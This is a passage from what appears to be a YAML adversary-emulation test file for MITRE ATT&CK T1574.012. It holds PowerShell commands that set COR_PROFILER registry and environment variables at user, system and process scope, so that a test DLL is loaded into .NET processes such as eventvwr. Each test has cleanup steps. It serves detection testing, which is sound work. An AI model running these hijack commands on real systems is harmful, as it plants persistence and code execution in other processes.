        New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32" -Value "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll" -Force | Out-Null
        New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
        New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
        New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll" -Force | Out-Null
        Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
        START MMC.EXE EVENTVWR.MSC
      cleanup: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null"
      timeout: 120
    - name: System Scope COR_PROFILER
      type: powershell
      platform: windows
      command: |-
        Write-Host "Creating system environment variables" -ForegroundColor Cyan
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value "PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll" -Force | Out-Null
      cleanup: |-
        Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null
        Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
        Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
      timeout: 120
      elevation_required: true
    - name: Registry-free process scope COR_PROFILER
      type: powershell
      platform: windows
      command: |-
        $env:COR_ENABLE_PROFILING = 1
        $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'
        $env:COR_PROFILER_PATH = '"PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll"'
        POWERSHELL -c 'Start-Sleep 1'
      cleanup: |-
        $env:COR_ENABLE_PROFILING = 0
        $env:COR_PROFILER = ''
        $env:COR_PROFILER_PATH = ''
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1574/012
  is_safe: false
